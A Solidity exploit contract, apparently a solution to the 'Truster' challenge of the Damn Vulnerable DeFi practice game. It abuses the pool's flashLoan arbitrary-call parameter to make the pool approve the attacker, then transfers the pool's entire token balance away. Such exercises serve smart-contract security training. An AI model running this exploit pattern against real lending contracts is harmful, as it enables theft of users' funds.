// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


// this contract will be executed on behalf of the lending pool, it will approve an allowance for the attacker EA
// thanks to this allowance which will be given during the flashloan function, the attacker will be able to spend
// the DVT tokens of the pool in a subsequent tx

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TrusterLenderPool.sol";

contract attacker2 {

    using Address for address payable;


    IERC20 public immutable damnValuableToken;
    uint256 public balAttacker0;

    constructor(address tokenAddress) {
        damnValuableToken = IERC20(tokenAddress);
    }

    function attack(address payable poolAddress, address payable attackerEA) public {

        balAttacker0 = damnValuableToken.balanceOf(address(this));

        TrusterLenderPool pool = TrusterLenderPool(poolAddress);
        uint256 balPool = damnValuableToken.balanceOf(poolAddress);

        // the lender contract flashLoan function has a paramter allowing to execute a function on another contract
        // on its behalf. Here we encode the call of this function. The approve function will allow to give the right
        // to the attacker to spend on behalf of the lender pool.
        bytes memory approval = abi.encodeWithSignature("approve(address,uint256)",address(this),balPool);

        // call the flashloan function, including the approval
        pool.flashLoan(0, attackerEA, address(damnValuableToken), approval);

        // once the flashloan is over, the approval is done and the attacked can transfer
        damnValuableToken.transferFrom(address(pool), attackerEA, balPool);

    }

}